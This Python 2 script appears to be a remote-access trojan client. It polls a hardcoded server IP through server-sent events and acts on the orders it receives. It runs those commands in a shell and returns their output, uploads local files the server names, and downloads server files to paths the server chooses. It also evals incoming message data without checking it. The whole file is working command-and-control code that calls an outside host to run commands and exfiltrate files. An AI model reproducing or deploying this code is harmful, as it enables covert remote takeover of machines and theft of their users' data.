from __future__ import print_function
import requests
from sseclient import SSEClient
import time
from subprocess import Popen, PIPE
import threading
import os
import Queue as queue
import string
import random

# set constant value
serverip = '18.213.1.57'
# serverip = 'localhost'
sse_uri = 'http://'+serverip+'/joseph/sse.php'
server_uri = 'http://'+serverip+'/joseph/server.php?client_id='
server_file = 'http://'+serverip+'/joseph/files/'
my_queue = queue.Queue()
event = threading.Event()
my_id=''

# get my IP address
def getIPAddress():
    # function to get ip address
    my_id = requests.get('https://api.ipify.org').text
    event.set()
    my_queue.put(my_id)

#show snipping
def snipping():
    # function to print snipping
    animation = "|/-\\"
    idx = 0
    while True:
        print(animation[idx % len(animation)], end="\r")
        idx += 1
        time.sleep(0.05)
        if event.is_set():
            break

# get my IP address
def getMyIP():
    t1 = threading.Thread(target=snipping, args=())
    t2 = threading.Thread(target=getIPAddress, args=())
 
    t1.start()
    t2.start()
    t2.join()
    my_data = my_queue.get()
    return my_data

def statusBackground(server_uri):
    while True:
        time.sleep(5)
        try:
            requests.get(server_uri)
        except:
            pass

def generateId(length):
    return ''.join(random.sample(string.ascii_uppercase + string.digits, k=length))

# def exit_handler():
    # time.sleep(3)
    # print('My application is ending!')

def post(data):
    try:
        response = requests.post(server_uri, data = data)
        return response.text
    except Exception as e:
        return e
    
# get filename from filepath:
def getFileName(filepath):
    x = filepath.rfind("/")
    y = filepath.rfind("\\")
    a=y
    if x > y:
        a=x
    if a == -1:
        filename = filepath
    else:
        filename = filepath[a+1:]
    return filename
# get foldername from filepath:
def getFolderName(filepath):
    x = filepath.rfind("/")
    y = filepath.rfind("\\")
    a = y
    if x > y:
        a=x
    if a == -1:
        filename = filepath
    else:
        filename = filepath[0:a]
    return filename

############################## START MAIN FUNCTION #############################
if __name__ == "__main__":
    # handle exit event
    # atexit.register(exit_handler)

    # get IP address
    # print("\n--- get my IP through api ---")
    # start_time = time.time()
    # my_id = getMyIP()
    # print(my_id)
    # print("--- %s seconds ---\n" % (time.time() - start_time))

    # connect to server
    print("\n--- connect to server.php ---")
    start_time = time.time()
    my_id = generateId(3)
    server_uri += my_id

    while True:
        try:
            server = requests.get(server_uri)
            break
        except Exception as e:
            print("Failed to connect server. Try again. Check internet connection")
    print(my_id)
    print("--- %s seconds ---\n" % (time.time() - start_time))

    # check available
    t1 = threading.Thread(target=statusBackground, args=(server_uri,))
    t1.start()
    while True:
        try:
            # server sent event client
            messages = SSEClient(sse_uri)
            # print(messages)
            prevMsg = {}
            for msg in messages:
                if msg.data:
                    data = eval(msg.data)
                    # print(data)
                    if (data != prevMsg) and (data['id'] == my_id):
                        if data['type'] == 'command':
                            print(['cd', '.', '&']+data['command'].split())
                            p = Popen(['cd', '.', '&']+data['command'].split(), stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
                            output, err = p.communicate(b"input data that is passed to subprocess' stdin")
                            rc = p.returncode
                            if rc == 0:
                                post({'action': 'command_result', 'client_id': my_id, 'cma_msg': output})
                            elif rc == 1:
                                post({'action': 'command_result', 'client_id': my_id, 'cma_msg': err})
                            else:
                                post({'action': 'command_result', 'client_id': my_id, 'cma_msg': 'There was some unknown error'})
                        
                        elif data['type'] == 'upload':
                            try:
                                fo = open(data['command'],'rb')
                                file = {'myfile': fo}
                                r = requests.post(
                                        server_uri, 
                                        files=file, 
                                        data={
                                            'action':'client_upload_result_success', 
                                            'cma_msg':'successfully downloaded', 
                                            'client_id': data['id']
                                        }
                                    )
                                if r.status_code != 200:
                                    print('sendErr: '+r.url)
                                else :
                                    print(r.text)
                                fo.close()
                            except Exception as e:
                                print('can\'t find file')
                                post({'action': 'client_upload_result_err', 'client_id': my_id, 'cma_msg': 'can\'t find file'})

                        elif data['type'] == 'download':
                            try:
                                filename = getFileName(data['command'])
                                destpath = getFolderName(data['command'])
                                file_url = server_file+filename
                                r = requests.get(file_url) # create HTTP response object
                                if not os.path.exists(destpath):
                                    os.makedirs(destpath)
                                    print(destpath+' is created')
                                with open(destpath+'\\'+filename,'wb') as f:
                                    f.write(r.content)
                                a = post({'action': 'client_download_result', 'client_id': my_id, 'cma_msg': 'success'})
                                print(a)
                            except Exception as e:
                                print('Error occured while downloading')
                                post({'action': 'client_download_result', 'client_id': my_id, 'cma_msg': 'error'})

                    prevMsg = data
                else:
                    pass
        except Exception as e:
            print(e)
            print('Check your internet connection, reconnecting...')
############################### END MAIN FUNCTION ##############################
